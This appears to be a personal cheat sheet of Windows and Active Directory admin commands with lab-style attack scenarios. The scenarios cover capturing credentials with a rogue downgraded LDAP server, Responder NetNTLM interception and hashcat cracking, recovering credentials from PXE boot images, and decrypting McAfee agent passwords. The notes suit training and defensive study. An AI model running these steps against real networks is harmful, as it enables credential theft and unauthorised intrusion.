# Just Commands

## Force update Group Policies

```powershell
gpupdate /force
```

## Reset password

```powershell
Set-ADAccountPassword <user> -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
```

## Force a password reset at the next logon

```powershell
Set-ADUser -ChangePasswordAtLogon $true -Identity <user> -Verbose
```

## DNS Configuration

```powershell
systemd-resolve --interface <interface> --set-dns <ip-addr> --set-domain <domain>
```

# Scenarios

## Scenario 1 (Hosting a Rogue LDAP Server)

```shell
service slapd stop
```

```shell
nc -lvp 389
```

**If there is objectclass0?supportedCapabilities error:**

```shell
sudo apt update && sudo apt -y install slapd ldap-utils && sudo systemctl enable slapd
```

```shell
sudo dpkg-reconfigure -p low slapd      #?
```

**olcSaslSecProps.ldif:**

```
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

**patch our LDAP server:**

```shell
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

**verify that our rogue LDAP server's configuration has been applied: (If you are using Kali, you may not receive any output)**

```shell
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

**capture the credentials: (If you receive "This distinguished name contains invalid syntax" error)**

```shell
sudo tcpdump -SX -i breachad tcp port 389
```

## Scenario 2 (Intercepting NetNTLM Challenge; MITM)

[Responder](https://github.com/lgandx/Responder)

```shell
sudo responder -I <interface>
```

[Hashcat](https://hashcat.net/hashcat/)

```shell
hashcat -m 5600 <hash file> <passwd file> --force
```

`-m 5600`: NTLMv2-SSP

## Scenario 3 (MDT & SCCM; PXE)

```shell
cd Documents
mkdir <username>
copy C:\powerpxe <username>\
cd <username>
```

```shell
tftp -i <mdt ip-addr> GET "\Tmp\x64{...}.bcd" conf.bcd
```

```shell
powershell -executionpolicy bypass
```

[powerpxe](https://github.com/wavestone-cdt/powerpxe)

```powershell
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile

>> Parse the BCD file: conf.bcd
>>>> Identify wim file : <PXE Boot Image Location>
<PXE Boot Image Location>
```

```shell
tftp -i <mdt ip-addr> GET "<PXE Boot Image Location>" pxeboot.wim
```

**Recovering Credentials from a PXE Boot Image**

```powershell
Get-FindCredentials -WimFile pxeboot.wim
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = <account>
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = <password>
```

## Scenario 4 (Configuration File Credentials)

```shell
cd C:\ProgramData\McAfee\Agent\DB
dir
```

```shell
scp <username>@<hostname>:C:/ProgramData/McAfee/Agent/DB/ma.db .
```

```shell
sqlitebrowser ma.db
```

[mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption)

```shell
python3 mcafee_sitelist_pwd_decrypt.py <auth passwd value>
```

# Win + R shortcuts

## System Configuration

```
msconfig
```

## Computer Management

```
compmgmt.msc
```

## Control Panel

```
control
```

## Task Manager

```
taskmgr
```

## Command Prompt

```
cmd
```

## Local Group Policy Editor

```
gpedit.msc
```

## Group Policy Management Console

```
gpmc.msc
```

## Management Console

```
mmc
```

## Registry Editor

```
regedit
```

## Event Viewer

```
eventvwr
```

## Local Users and Groups

```
lusrmgr.msc
```

## Remote Desktop Connection

```
mstsc
```

## System Information

```
msinfo32
```

## Windows version information

```
winver
```

## Performance Monitor

```
perfmon
```

## Resource Monitor

```
resmon
```